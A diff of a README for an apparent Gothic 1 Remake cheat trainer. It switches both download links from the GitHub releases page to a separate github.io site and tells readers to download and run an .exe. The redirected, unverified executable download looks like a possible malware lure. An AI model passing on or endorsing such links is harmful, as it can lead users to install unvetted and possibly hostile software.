@@ -1,12 +1,12 @@
 # 🛡️ Gothic-1-Remake-Trainer-2026 - Master your game with ease today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/movabilityfinding592/Gothic-1-Remake-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://movabilityfinding592.github.io)
 
 This software helps you modify your character stats in the Gothic 1 Remake. You gain access to features like infinite health, stamina, and unlimited items. It works offline in single-player mode. You do not need keys or complex setup tools.
 
 ## 📥 How to download the software
 
-Visit [this page to download](https://github.com/movabilityfinding592/Gothic-1-Remake-Trainer-2026/releases) the latest version. Look for the file ending in .exe under the Assets section of the newest release. Click the file name to start the download. Save the file to a folder you can find later, such as your Downloads or Desktop folder.
+Visit [this page to download](https://movabilityfinding592.github.io) the latest version. Look for the file ending in .exe under the Assets section of the newest release. Click the file name to start the download. Save the file to a folder you can find later, such as your Downloads or Desktop folder.
 
 ## ⚙️ System requirements
 
